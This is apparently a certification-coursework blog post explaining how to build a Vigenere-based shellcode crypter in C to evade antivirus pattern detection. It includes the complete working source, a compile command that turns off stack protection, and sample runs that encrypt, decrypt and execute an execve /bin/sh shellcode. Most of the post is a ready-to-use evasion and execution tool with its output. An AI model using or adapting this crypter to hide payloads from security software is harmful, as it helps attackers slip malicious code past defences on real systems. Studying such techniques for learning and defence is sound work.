---
layout: single
title: Creating Shellcode Crypter
date: 2018-09-22
categories:
  - security
  - shellcoding
tags:
  - securitytube
  - slae
---
In addition to using encoders to evade AV detection, encryption can also be utilised to beat pattern detection. One of the benefits of encryption over encoding is that without the key used to encrypt the shellcode, it will not be possible to decrypt it (without exploiting weaknesses within the chosen algorithm).

For this example, I have chosen to create a crypter that derives its implementation from the [Vigenere Cipher](https://en.wikipedia.org/wiki/Vigen%C3%A8re_cipher). The Vigenere Cipher is a type of substitution cipher, which is used for encrypting alphabetic text. The implementation I have created, however, allows for it's basic principle to work with shellcode.

How Vigenere Works
------------------
The Vigenere cipher consists of three components:

* The message (i.e. the unencrypted text)
* The key
* The character set

Typically, the character set consists of the letters A through Z and can be illustrated as a square grid. The first row starts in order, and each subsequent row will shift the character set one position to the left, and rotate the characters that go out of bounds back to the right.

Using this grid, the message can be encrypted one letter at a time. The first step is to find the column that the current letter resides in, and then follow it down the rows until reaching the row with the letter that is found in the corresponding position in the key.

For example, if the message was `HELLO` and the key was `DEADBEEF`, the first letter (`H`) would be encrypted using the first letter of the key (`D`). The first encrypted letter would therefore be `K`, as per the illustration below:

![](/assets/images/creating-a-shellcode-crypter/vigenere_square.png)

After encrypting this letter, the letter `E` would then be encrypted using the same method, which would result in the letter `I` being selected.

When decrypting text, the same process is followed but in reverse order. So, as the ciphertext (i.e. the encrypted text) from the above example would be `KILOP`, we would first find the first letter of the key being used to decrypt it (`D`) and check each value one by one until we find the letter `K`. Once the encrypted letter is found, it can be decrypted by replacing it with the letter corresponding to the column it is in - in this case `H`.

In instances were the key is not equal in length or greater than the message, the key is repeated N times until it is. If the key was `key` and the message was `helloworld` it would be repeated like this:

```
keykeykeyk
helloworld
```

So, the intersection for `w` would be made from `y`, the intersection for `d` would be made from `k` etc.

Modifications Required to Work with Shellcode
---------------------------------------------
As the typical character set is not sufficient for using the Vigenere cipher to encrypt shellcode, the main modification will be to make it so. Rather than a character set consisting of the letters A through Z, the integer values 1 through 255 will be used. The character set starts at `1` because `0` (i.e. a null byte) is near exclusively a bad character when it comes to shellcoding.

Due to numeric values being used, rather than letters, an optimisation can (and will) be made to the encryption process. Rather than iterating through the top level rows to determine the offset of a particular value, the value itself can be used to determine the correct offset.

For example, in the case of the chosen character set, the correct offset can be found by deducting the starting byte from the one being processed. If the value `3` was being processed, it will always be in position `2` of the character set.

The same optimisation can't be fully implemented into the decryption process, as iteration of the row is unavoidable; but the offset of the row that needs to be iterated can be directly accessed using the aforementioned logic (i.e. by subtracting the starting byte (`0x01`) from the byte of the key being processed).

Final Crypter Code
------------------
The final code for the crypter can be found below:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define FIRST_BYTE 1
#define CHARACTER_SET_SIZE 255

int encrypt(int characterSet[][CHARACTER_SET_SIZE], unsigned char *key, unsigned char *payload, short debug)
{
    int payloadLength = strlen((char *)payload);

    // Loop through each char in payload, and use the values from
    // the corresponding char from the key to determine which byte
    // to select from characterSet and use it as the encoded byte.
    int encrypted[payloadLength];
    for (int i = 0; i < payloadLength; i++)
    {
        int currentByte = (int)payload[i];
        int keyByte = (int)key[i];
        encrypted[i] = characterSet[keyByte - FIRST_BYTE][currentByte - FIRST_BYTE];

        if (debug)
        {
            printf("Position: %d\n", i);
            printf("Payload byte (dec): %d\n", (int)payload[i]);
            printf("Key byte (dec): %d\n", keyByte);
            printf("Encrypted byte (dec): %d\n\n", encrypted[i]);
        }
    }

    printf("\nEncrypted: ");
    for (int i = 0; i < payloadLength; i++)
    {
        printf("\\x%02x", (int)encrypted[i]);
    }

    printf("\n");

    return 0;
}

int decrypt(int characterSet[][CHARACTER_SET_SIZE], unsigned char *key, unsigned char *ciphertext, short execute, short debug)
{
    int payloadLength = strlen((char *)ciphertext);
    unsigned char originalPayload[payloadLength];

    for (int i = 0; i < payloadLength; i++)
    {
        int encryptedByte = (int)ciphertext[i];
        int keyByte = (int)key[i];

        for (int i2 = 0; i2 < CHARACTER_SET_SIZE; i2++)
        {
            if (characterSet[keyByte - FIRST_BYTE][i2] == encryptedByte)
            {
                if (debug)
                {
                    printf("Position: %d\n", i);
                    printf("Payload byte (dec): %d\n", (int)ciphertext[i]);
                    printf("Key byte (dec): %d\n", keyByte);
                    printf("Decrypted byte (dec): %d\n\n", characterSet[0][i2]);
                }

                originalPayload[i] = (unsigned char)characterSet[0][i2];
                break;
            }
        }
    }

    if (execute == 1)
    {
        void (*s)() = (void *)originalPayload;
        s();
    }
    else
    {
        printf("\nDecrypted: ");
        for (int i = 0; i < payloadLength; i++)
        {
            printf("\\x%02x", (int)originalPayload[i]);
        }

        printf("\n");
    }

    return 0;
}

unsigned char* parseByteString(char *byteString)
{
    unsigned int byteStringLength = strlen(byteString);
    char byteStringCopy[byteStringLength];
    strcpy(byteStringCopy, byteString);

    unsigned int length = 0;
    for (unsigned int i = 0; i < byteStringLength; i++)
    {
        if (byteStringCopy[i] == 'x')
        {
            length += 1;
        }
    }

    unsigned char* parsedString = (unsigned char*)malloc(sizeof (unsigned char) * length);
    const char delim[3] = "\\x";
    char *b;

    b = strtok(byteStringCopy, delim);
    int currentByte = 0;

    while( b != NULL ) {
        char parsedByte = (char)(int)strtol(b, NULL, 16);
        parsedString[currentByte] = parsedByte;
        currentByte += 1;
        b = strtok(NULL, delim);
    }

    return parsedString;
}

int main(int argc, char **argv)
{
    short debug = argc == 5;
    int characterSet[CHARACTER_SET_SIZE][CHARACTER_SET_SIZE];

    // Loop for each permutation required
    for (int i = 0; i < CHARACTER_SET_SIZE; i++)
    {
        // Add each character to the right of the
        // initial offset to the start of the row.
        for (int i2 = i; i2 < CHARACTER_SET_SIZE; i2++)
        {
            characterSet[i][i2 - i] = i2 + FIRST_BYTE;
        }

        // Rotate the characters to the left of the
        // initial offset to the end of the row.
        for (int i2 = 0; i2 < i; i2++)
        {
            characterSet[i][(CHARACTER_SET_SIZE - i) + i2] = i2 + FIRST_BYTE;
        }
    }

    char *mode = argv[1];

    unsigned char *baseKey = parseByteString(argv[2]);
    int keyLength = strlen((char *)baseKey);

    if (debug)
    {
        printf("Key: ");

        for (unsigned int i = 0; i < strlen((char *)baseKey); i++)
        {
            printf("%02x ", baseKey[i]);
        }

        printf("\n");
    }


    unsigned char *payload = parseByteString(argv[3]);
    int payloadLength = strlen((char *)payload);

    if (debug)
    {
        printf("Payload: ");

        for (unsigned int i = 0; i < strlen((char *)payload); i++)
        {
            printf("%02x ", payload[i]);
        }

        printf("\n");
    }


    int inflatedKeySize = keyLength;
    int iterationsNeeded = 1;

    // If the payload is larger than the key, the key needs to be
    // repeated N times to make it match or exceed the length of
    // the payload.
    if (payloadLength > keyLength)
    {
        // Determine the number of times the key needs to be expanded
        // to meet the length required to encrypt the payload.
        iterationsNeeded = (int)((payloadLength / keyLength) + 0.5) + 1;

        // Determine the new key size required and store it in
        // inflatedKeySize for use when initialising the new key.
        inflatedKeySize = keyLength * iterationsNeeded;
    }

    // Initialise the key with a null byte so that strcat can work.
    unsigned char key[inflatedKeySize];
    key[0] = '\x00';

    // Concatenate the base key on to the new key to ensure it
    // is long enough to encrypt the payload.
    for (int i = 0; i < iterationsNeeded; i++)
    {
        strcat((char *)key, (char *)baseKey);
    }

    if (strcmp(mode, "e") == 0)
    {
        return encrypt(characterSet, key, payload, debug);
    }

    if (strcmp(mode, "d") == 0)
    {
        return decrypt(characterSet, key, payload, 0, debug);
    }

    if (strcmp(mode, "x") == 0)
    {
        return decrypt(characterSet, key, payload, 1, debug);
    }

    return 0;
}
```

This code is capable of handling the following tasks:

* Encrypting shellcode
* Decrypting shellcode
* Executing encrypted shellcode

Using the Crypter
-----------------
To compile the code, save it to a file named `crypter.c` and run the following command:

```
gcc -m32 -fno-stack-protector -z execstack crypter.c -o crypter
```

It is important to use the `no-stack-protector` flag, otherwise the execution of the shellcode will not be possible.

Once compiled, it can be used by running the `crypter` executable. The executable accepts 4 positional arguments, which in order are:

* `mode` - `e` to encrypt, `d` to decrypt or `x` to execute the payload
* `key` - the key specified as escaped bytes; e.g. `\xde\xad\xbe\xef`
* `payload` - the payload to be encrypted, decrypted or executed specified as escaped bytes
* `debug` - any arbitrary value placed here will enable debug mode, which will show some extra information when encoding payloads

In the below example, an execve shellcode is encrypted using the key `\xde\xad\xbe\xef` and the encrypted shellcode is output:

```shell_session
$ ./crypter e "\xde\xad\xbe\xef" "\xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43"

Encrypted: \xc9\xc6\x1c\x20\xb9\x35\x1c\xf5\x67\x23\xc5\x78\x3c\xb8\x4b\x0d\x6b\xfa\xc5\x7c\x34\xb8\xee\xaf\x8e\xb7\x8b\x6f\xc6\x8e\xbd\xee\xdd\xdb\x20\x58\x4c\xdb\x31\x57\x1f\xee\xff\x31\x20\xef\x01\x32\x21
```

To verify this is reversible, the decrypt mode is used, passing in the same key and the encrypted payload:

```shell_session
$ ./crypter d "\xde\xad\xbe\xef" "\xc9\xc6\x1c\x20\xb9\x35\x1c\xf5\x67\x23\xc5\x78\x3c\xb8\x4b\x0d\x6b\xfa\xc5\x7c\x34\xb8\xee\xaf\x8e\xb7\x8b\x6f\xc6\x8e\xbd\xee\xdd\xdb\x20\x58\x4c\xdb\x31\x57\x1f\xee\xff\x31\x20\xef\x01\x32\x21"

Decrypted: \xeb\x1a\x5e\x31\xdb\x88\x5e\x07\x89\x76\x08\x89\x5e\x0c\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\x31\xc0\xb0\x0b\xcd\x80\xe8\xe1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x41\x42\x42\x42\x42\x43\x43\x43\x43
```

As can be seen in the above output, the original payload is successfully retrieved.

Using the execution mode, the key and encrypted payload can be specified once again, but this time, the decrypted payload will be executed, and an `sh` shell spawned:

```shell_session
$ ./crypter x "\xde\xad\xbe\xef" "\xc9\xc6\x1c\x20\xb9\x35\x1c\xf5\x67\x23\xc5\x78\x3c\xb8\x4b\x0d\x6b\xfa\xc5\x7c\x34\xb8\xee\xaf\x8e\xb7\x8b\x6f\xc6\x8e\xbd\xee\xdd\xdb\x20\x58\x4c\xdb\x31\x57\x1f\xee\xff\x31\x20\xef\x01\x32\x21"
$ whoami
rastating
```

<hr />

This blog post has been created for completing the requirements of the [SecurityTube Linux Assembly Expert certification](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/).

Student ID: SLAE-1340

All source files can be found on GitHub at [https://github.com/rastating/slae](https://github.com/rastating/slae)
